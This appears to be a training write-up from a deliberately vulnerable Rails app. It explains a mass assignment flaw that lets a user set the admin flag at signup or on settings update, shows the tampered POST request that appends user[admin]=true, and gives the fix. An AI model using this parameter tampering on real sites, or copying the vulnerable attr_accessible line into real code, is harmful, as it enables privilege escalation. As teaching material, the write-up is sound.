# Description

The application allows the admin attribute of a User model to be set through a mass assignment call. This vulnerability exists because a developer has indicated it is acceptable to set or change the admin value through the use of the attr_accessible setting. Any action that uses mass assignment to create a user or modify a user's settings is susceptible to this attack which would allow vertical privilege escalation.

# Bug

The bug is introduced within app/models/user.rb, seen on line 3 (:admin):

```ruby
class User < ActiveRecord::Base
  attr_accessible :email, :password, :admin, :password_confirmation, :first_name, :last_name
```

Any attribute added to the attr_accessible setting can be used during a mass assignment call. What this means is that conceptually, the following is allowed:

```ruby
# Note the string "true"/"false" or 1/0, etc. can be added to specify the boolean attribute...
# is true or false thanks to ActiveRecord
User.new(
  :email => "email@email.com",
  :admin => "true",
  :password => "h4xx0r",
  :first_name => "Captain",
  :last_name => "Crunch"
)
```

# Solution

### Mass Assignment ATTACK:

Through the use of an intercepting proxy, we are able to capture our form submission after entering our information on the sign up page. The request looks like this...

    POST /users HTTP/1.1
    Host: railsgoat.dev
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:19.0) Gecko/20100101 Firefox/19.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: http://railsgoat.dev/signup
    Cookie: _railsgoat_session=[redacted]
    Connection: keep-alive
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 248
    
    utf8=â&authenticity_token=GXhLKKhfBXdFx5i6iqHEd5E32Kebn1+G35eA87RW1tU=&user[email]=test@test.com&user[first_name]=test&user[last_name]=test&user[password]=testtest&user[password_confirmation]=testtest&commit=Submit

...and the attack is quite simple. Append a parameter to the body of this POST request that specifies the admin value is true.

    utf8=â&authenticity_token=GXhLKKhfBXdFx5i6iqHEd5E32Kebn1+G35eA87RW1tU=&user[email]=test@test.com&user[first_name]=test&user[last_name]=test&user[password]=testtest&user[password_confirmation]=testtest&commit=Submit&user[admin]=true

So when the request is received by the create method within the user controller (code shown below), the admin attribute is set to true upon user creation.

```ruby
def create
  user = User.new(params[:user])
  user.build_retirement(POPULATE_RETIREMENTS.shuffle.first)
  user.build_paid_time_off(POPULATE_PAID_TIME_OFF.shuffle.first).schedule.build(POPULATE_SCHEDULE.shuffle.first)
  user.build_work_info(POPULATE_WORK_INFO.shuffle.first)
  user.performance.build(POPULATE_PERFORMANCE.shuffle.first)
  if user.save
    session[:user_id] = user.user_id
    redirect_to home_dashboard_index_path
  else
    @user = user
    render :new
  end
end
```

The last thing to mention here is that this can be done either through the signup page or when you edit your account settings.

### Mass Assignment SOLUTION:

The solution is fairly simple, remove the admin attribute from the attr_accessible method. The following code shows what we mean:

```ruby
# Note that the admin attr has been removed 
            
class User < ActiveRecord::Base
  attr_accessible :email, :password, :password_confirmation, :first_name, :last_name
```ruby

# Hint

Did you register your account correctly? How about when you updated your settings?